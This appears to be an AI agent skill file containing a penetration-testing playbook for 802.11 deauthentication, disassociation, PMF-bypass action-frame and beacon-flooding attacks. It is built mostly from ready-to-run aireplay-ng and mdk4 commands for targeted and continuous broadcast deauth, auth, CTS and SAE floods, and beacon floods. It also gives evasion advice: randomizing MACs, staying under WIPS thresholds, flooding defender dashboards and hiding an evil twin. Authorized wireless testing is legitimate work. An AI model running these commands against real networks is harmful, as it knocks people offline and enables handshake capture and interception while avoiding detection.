---
name: offensive-deauth-disassoc
description: Deauthentication and disassociation attacks against 802.11 networks —
  targeted single-client deauth for handshake capture, broadcast deauth for DoS (with
  authorization), action-frame attacks bypassing 802.11w (PMF), beacon flooding, mdk4
  / aireplay-ng tooling, and rate-limit / PMF-aware operation. Use to coerce client
  reconnection (handshake capture, evil-twin roaming), as targeted DoS, or to test
  PMF posture.
---

# Deauth / Disassoc Attacks

The most-used 802.11 management-frame attack: send a forged deauthentication or disassociation frame as the AP, and the client disconnects. Modern PMF (802.11w) authenticates these frames cryptographically — but most consumer and many enterprise deployments still don't require PMF.

## Quick Workflow

1. Identify target client + AP (BSSID, channel)
2. Pick deauth scope: single client (quiet) vs. broadcast (loud, DoS)
3. Verify PMF status — if required, classic deauth fails; pivot to action-frame attacks
4. Send the deauth burst at the right rate

---

## Single-Client Deauth (Preferred)

Used to force handshake capture, push client to evil twin, or test reconnection behavior.

```bash
sudo aireplay-ng --deauth 5 \
  -a AA:BB:CC:DD:EE:FF \    # AP BSSID
  -c 11:22:33:44:55:66 \    # client MAC
  wlan0mon
```

- `--deauth 5` sends 5 deauths (10 frames — 5 to AP, 5 to client). 3–10 is usually enough.
- More than 30 in a burst is unnecessarily noisy.

## Broadcast Deauth (DoS, Use Sparingly)

```bash
# Single AP, all clients
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# --deauth 0 = continuous

# Multiple APs from a list
sudo mdk4 wlan0mon d -B target_bssids.txt -c 1,6,11
```

Only with explicit authorization. Continuous broadcast deauth is a clear DoS signal and trips most WIPS within seconds.

## PMF (802.11w) Awareness

PMF authenticates deauth/disassoc frames. Status visible in beacon RSN capabilities:

```bash
sudo airodump-ng wlan0mon -c <ch> --bssid <BSSID>
# PMF column: Required / Capable / Off
```

| PMF Status | Deauth Effect |
|---|---|
| Off | Classic deauth works |
| Capable (optional) | Works against clients without PMF, fails against PMF-enabled clients |
| Required | Classic deauth ignored — must use action-frame attacks |

## Action-Frame Attacks Against PMF

PMF protects deauth/disassoc but doesn't always protect all action frames. Specific action types remain exploitable:

```bash
# mdk4 multi-tool attacks
sudo mdk4 wlan0mon a -a <BSSID>     # auth attack: floods auth frames, AP eventually disconnects clients
sudo mdk4 wlan0mon m -t <BSSID>     # CTS frame attack — abuse virtual carrier sense
sudo mdk4 wlan0mon w -t <BSSID>     # WPA-Enterprise: SAE auth flood
```

Action frames the IEEE 802.11 spec marks as "may be unprotected" include some block-ack and channel-switch announcements — implementation-specific exploitation paths exist but require chipset-specific testing.

## Beacon Flooding

Confuse clients (and WIPS) by flooding fake beacons:

```bash
sudo mdk4 wlan0mon b -f beacon_essids.txt -c 6 -s 100
# Floods 100 beacons/sec for ESSIDs in the file
```

Use cases:
- Hide your evil twin among noise
- Stress-test client roaming logic
- DoS WIPS dashboards (flood with thousands of fake APs)

## Rate Tuning and Detection

| Burst | Defender Signal |
|---|---|
| 3–10 deauth, single client | Often misclassified as roaming or RF noise |
| >30 deauth/sec from one source | WIPS rule trips |
| Continuous broadcast deauth | Clear DoS — alert + ticket within minutes |
| Beacon flood >50/sec | Saturates WIPS dashboards |

Randomize source MAC across burst-and-pause cycles to spread the signal.

## Engagement Cheatsheet

```bash
# 1. Recon — note PMF status per target
sudo airodump-ng wlan0mon -c <ch> --bssid <BSSID>

# 2. Single-client deauth for handshake capture
sudo aireplay-ng --deauth 3 -a <BSSID> -c <client> wlan0mon

# 3. PMF blocking? Try action-frame attacks
sudo mdk4 wlan0mon a -a <BSSID>

# 4. DoS scenario (authorized)
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

## Reporting

Document for each test:

- Target BSSID + ESSID + PMF status
- Burst size, duration
- Effect observed (client reconnected? handshake captured? DoS achieved?)
- Detection signals defender would have seen

---

## Key References

- aireplay-ng documentation
- mdk4: github.com/aircrack-ng/mdk4
- IEEE 802.11w-2009 (PMF spec, now folded into 802.11-2020)
- "Why MAC Address Randomization Doesn't Work" — research on action-frame leakage
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
